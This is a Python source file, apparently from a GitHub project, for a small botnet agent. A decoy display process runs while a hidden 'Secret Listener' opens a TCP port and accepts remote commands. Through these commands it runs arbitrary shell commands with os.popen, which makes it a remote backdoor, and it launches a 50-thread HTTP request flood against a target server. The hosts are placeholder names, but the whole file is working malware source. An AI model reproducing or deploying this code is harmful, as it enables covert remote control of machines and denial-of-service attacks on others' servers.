"""
Description: A simple bonet program
Author: github.com/h-i-e-u
Version: 1.0
"""
import threading
from multiprocessing import Process
import time
import os
import socket
import requests
# =========================

# Configuration
LISTEN_IP = "bot"
LISTEN_PORT = 7777

# gb var
attack_threads = []
attack_active = False


# =========================
# Display 
# =========================
def display():
    welcome_message = '''
         ---- Welcome to Botnet Program ----
      
    '''
    print(welcome_message)

    try:
        c = 0
        while True:
            c += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(welcome_message)
            print(f"Session ==> {c}")
            print("Sleeping for 3 seconds...")
            time.sleep(3)
    except KeyboardInterrupt:
        print("\nUser interrupted. Exiting botnet program.")


# ====================
# Background Listener
# ====================
def command_listener():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((LISTEN_IP, LISTEN_PORT))
        server_socket.listen()
        print(f"[Secret Listener] Listening on {LISTEN_IP}:{LISTEN_PORT}")

        while True:
            conn, addr = server_socket.accept()
            print(f"[Secret Listener] Connection from {addr}")
            with conn:
                data = conn.recv(1024).decode('utf-8').strip()
                if not data:
                    continue

                print(f"[Command Received] {data}")
                response = handle_command(data)
                conn.sendall(response.encode('utf-8'))


# ====================
# Command Handler
# ====================
def handle_command(command):
    global attack_active

    if command.lower() == "check":
        return "Listener is active and ready."
    
    elif command.lower() == "start_attack":
        if not attack_active:
            attack_active = True
            attack()
            return "Attack started."
        return "Attack is already running."
    
    elif command.lower() == "stop_attack":
        if attack_active:
            attack_active = False
            stop_attack()
            return "Attack stopped."
        return "No attack is currently running."

    elif command.lower().startswith("run:"):
        # Extract command after 'run:'
        cmd = command[4:].strip()
        try:
            output = os.popen(cmd).read().strip()
            return output if output else "Command ran successfully but no output."
        except Exception as e:
            return f"Error running command: {e}"

    else:
        return "Unknown command. Use 'check' or 'run:<command>'."

# ====================
# Attack multithreaded
# ====================
def attack():
    global attack_threads, attack_active
    attack_threads.clear()
    for i in range(50):
        if not attack_active:
            break
        t = threading.Thread(target=attack_target)
        t.daemon = True
        attack_threads.append(t)
        t.start()
        time.sleep(0.1)

def attack_target():
    global attack_active
    while attack_active:
        try:
            requests.get("http://server:5000/")
        except Exception as e:
            return f"Error during attack: {e}"

def stop_attack():
    global attack_threads
    for thread in attack_threads:
        if thread.is_alive():
            thread.join(timeout=1)
    attack_threads.clear()        


# ====================
# Main Entry
# ====================
if __name__ == '__main__':
    try:
        front = Process(target=display)
        back = Process(target=command_listener)

        front.start()
        back.start()

        front.join()
        back.join()
    except Exception as e:
        print(f"Error occurred: {e}")
